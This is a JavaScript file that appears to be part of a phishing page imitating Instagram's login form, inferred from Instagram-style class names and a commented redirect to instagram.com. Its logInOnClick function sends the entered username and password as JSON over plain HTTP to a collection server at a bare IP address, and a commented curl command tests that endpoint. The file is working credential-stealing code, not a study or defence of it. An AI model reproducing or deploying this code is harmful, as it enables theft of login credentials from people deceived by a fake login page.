// will add/remove the FATdn class to the username/password fields
function onUsernameInput() {
    var inputText = document.getElementById("username-input-box").value;
    if (inputText) {
        document.getElementById("username-input-label").className = "f0n8F FATdn";
    } else {
        document.getElementById("username-input-label").className = "f0n8F ";
    }
    activateLoginButton();
}

function onPasswordInput() {
    var inputText = document.getElementById("password-input-box").value;
    if (inputText) {
        document.getElementById("password-input-label").className = "f0n8F FATdn";
    } else {
        document.getElementById("password-input-label").className = "f0n8F ";
    }
    activateLoginButton();
}

function activateLoginButton() {
    var usernameInputText = document.getElementById("username-input-box").value;
    var passwordInputText = document.getElementById("password-input-box").value;
    if (usernameInputText && passwordInputText) {
        document.getElementById("login-button").removeAttribute("disabled");
    } else {
        document.getElementById("login-button").setAttribute("disabled", "disabled");
    }
}

function logInOnClick() {
    var usernameInputText = document.getElementById("username-input-box").value;
    var passwordInputText = document.getElementById("password-input-box").value;
    var data = {
        username: usernameInputText,
        password: passwordInputText
    };
    var xhr = new window.XMLHttpRequest();
    xhr.open('POST', 'http://23.233.39.254:3000/userinfo', true);
    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
    xhr.send(JSON.stringify(data))
    console.log(usernameInputText + ", " + passwordInputText);
    // document.location.href = "instagram.com";

    /*
    curl --header "Content-Type: application/json" --request POST --data '{"username":"xyz","password":"xyz"}' http://23.233.39.254:3000/userinfo
  */
}